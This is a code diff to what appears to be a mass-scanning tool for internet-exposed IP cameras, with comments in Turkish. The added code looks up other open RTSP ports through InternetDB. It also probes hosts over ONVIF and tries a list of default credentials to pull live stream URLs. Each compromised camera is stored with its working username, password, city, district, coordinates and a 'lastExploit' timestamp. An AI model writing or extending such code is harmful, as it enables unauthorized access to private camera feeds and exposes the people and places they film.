@@ -19,6 +19,8 @@ import { GeoLocator } from './geoip';
 import { scanPort, quickRtsp, rtspAlive, rtspBanner, rtspVendor, MASS_CREDS } from './massscan';
 import { tryProprietaryAuth, dahuaRtspPath, hikRtspPath } from './proprietary';
 import { runCloudScan } from './cloud';
+import { onvifProbe, onvifStreams } from './onvif';
+import { internetDb } from './internetdb';
 
 const WEB_PORTS = new Set([80, 8080, 8000]);
 const offlineSince = new Map<string, number>();
@@ -422,7 +424,20 @@ export async function runMassScan(
       const lon = geo?.lon || 0;
 
       const id = hashId(`rtsp://${ip}:${port}`);
-      const qr = await quickRtsp(ip, port);
+      let qr = await quickRtsp(ip, port);
+      if (!qr) {
+        // InternetDB (ücretsiz, anahtarsız): bu IP'nin DİĞER açık RTSP portlarını dene.
+        const idb = await internetDb(ip);
+        for (const p of idb?.ports || []) {
+          if (p !== port && (p === 554 || p === 8554 || p === 10554 || p === 1554)) {
+            const alt = await quickRtsp(ip, p);
+            if (alt) {
+              qr = alt;
+              break;
+            }
+          }
+        }
+      }
       const vendor = rtspVendor(await rtspBanner(ip, port)) as DeviceVendor;
       let status: DeviceStatus = 'DISCOVERED';
       let url = '';
@@ -508,6 +523,32 @@ async function httpCveScan(store: CameraStore, registry: CameraRegistry, ips: st
   const workers = Array.from({ length: Math.min(20, Math.max(hosts.length, 1)) }, async () => {
     while (idx < hosts.length) {
       const ip = hosts[idx++];
+
+      // ONVIF — satıcı-bağımsız: GetStreamUri ile doğrudan RTSP adresi.
+      const onvifPath = await onvifProbe(ip, 80, 3000);
+      if (onvifPath) {
+        let got = false;
+        for (const [u, p] of MASS_CREDS.slice(0, 8)) {
+          const streams = await onvifStreams(ip, 80, u, p, 5000);
+          for (const s of streams.slice(0, 4)) {
+            if (!(await verifyStream(s.url, 6000))) continue;
+            const geo = await geoLocator.resolve(ip);
+            const id = hashId(s.url);
+            const dev: DeviceRecord = {
+              id, ip, port: 554, vendor: 'generic', model: '', city: geo?.il || '', district: geo?.ilce || '',
+              lat: geo?.lat || 0, lon: geo?.lon || 0, status: 'LIVE', protocol: 'rtsp', url: s.url,
+              username: u, password: p, source: 'scan', firstSeen: Date.now(), lastSeen: Date.now(), lastExploit: Date.now(),
+            };
+            store.upsertDevice(dev);
+            store.recordCredSuccess('generic', u, p);
+            if (!registry.get(id)) registry.add(toRegistered(dev));
+            live++;
+            got = true;
+          }
+          if (got) break; // doğru cred bulundu
+        }
+      }
+
       const banner = await grabBanner(ip, 80);
       let vendor = fingerprint(banner.server, banner.title);
       if (vendor === 'generic') continue;
